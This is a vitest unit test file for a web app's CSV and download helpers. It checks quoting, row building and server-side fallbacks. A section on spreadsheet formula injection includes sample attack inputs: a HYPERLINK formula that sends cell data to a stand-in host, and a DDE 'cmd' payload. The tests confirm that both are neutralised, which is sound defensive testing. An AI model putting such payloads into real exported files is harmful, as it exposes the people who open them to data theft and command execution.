import { describe, it, expect } from "vitest";
import { csvCell, toCsv, downloadBlob, downloadText, downloadCsv } from "./download";

// lib/download.ts is the single primitive every download in the app goes
// through, and it had no tests at all. The DOM half (downloadBlob) is covered
// by Playwright, which has a real browser; these cover the pure half plus the
// server-side guards, which is everything vitest's node environment can reach
// honestly. No jsdom — this suite is deliberately hermetic.

describe("csvCell", () => {
  it("always wraps in quotes", () => {
    expect(csvCell("plain")).toBe('"plain"');
  });

  it("doubles embedded quotes so the field cannot be broken out of", () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it("keeps commas and newlines inside the field", () => {
    expect(csvCell("Perrine, Marie")).toBe('"Perrine, Marie"');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
  });

  it("renders null and undefined as empty", () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });
});

describe("csvCell — spreadsheet formula injection", () => {
  // The waitlist CSV is admin-facing, but every value in it was typed by a
  // stranger into a public form. Quoting does NOT protect against this: the
  // quotes are consumed when the CSV is parsed, and the cell is then evaluated.
  it("defuses the four formula lead-ins", () => {
    expect(csvCell("=1+1")).toBe(`"'=1+1"`);
    expect(csvCell("+1+1")).toBe(`"'+1+1"`);
    expect(csvCell("@SUM(A1)")).toBe(`"'@SUM(A1)"`);
    expect(csvCell("\tsneaky")).toBe(`"'\tsneaky"`);
  });

  it("defuses a realistic exfiltration payload", () => {
    const attack = '=HYPERLINK("https://evil.example/"&A1,"Click me")';
    const out = csvCell(attack);

    expect(out.startsWith(`"'=`)).toBe(true);
    // The payload is preserved verbatim for the reader, just not executable.
    expect(out).toContain("evil.example");
  });

  it("leaves legitimate negative numbers numeric", () => {
    expect(csvCell("-12")).toBe('"-12"');
    expect(csvCell(-12)).toBe('"-12"');
    expect(csvCell("-3.5")).toBe('"-3.5"');
  });

  it("does not touch values that merely contain an equals sign", () => {
    expect(csvCell("a=b")).toBe('"a=b"');
  });
});

describe("toCsv", () => {
  it("builds a CRLF-delimited document", () => {
    const csv = toCsv([
      ["email", "name"],
      ["marie@example.com", "Marie"],
    ]);

    expect(csv).toBe('"email","name"\r\n"marie@example.com","Marie"');
  });

  it("keeps row and column counts intact with awkward values", () => {
    const csv = toCsv([
      ["a", "b"],
      ["has,comma", 'has"quote'],
      [null, undefined],
    ]);

    expect(csv.split("\r\n")).toHaveLength(3);
  });

  it("produces an empty string for no rows", () => {
    expect(toCsv([])).toBe("");
  });

  it("escapes every cell it emits, including injected ones", () => {
    const csv = toCsv([["name"], ["=cmd|'/c calc'!A0"]]);
    expect(csv).toContain(`"'=cmd`);
  });
});

describe("server-side safety", () => {
  // These run in vitest's node environment, where there is no window or
  // document. They must degrade rather than throw — lib/download.ts is imported
  // by client components that Next also renders on the server.
  it("downloadBlob reports failure instead of throwing", () => {
    expect(() => downloadBlob(new Blob(["x"]), "x.txt")).not.toThrow();
    expect(downloadBlob(new Blob(["x"]), "x.txt")).toBe(false);
  });

  it("downloadText and downloadCsv degrade the same way", () => {
    expect(downloadText("x", "x.txt")).toBe(false);
    expect(downloadCsv("a,b", "x.csv")).toBe(false);
  });
});
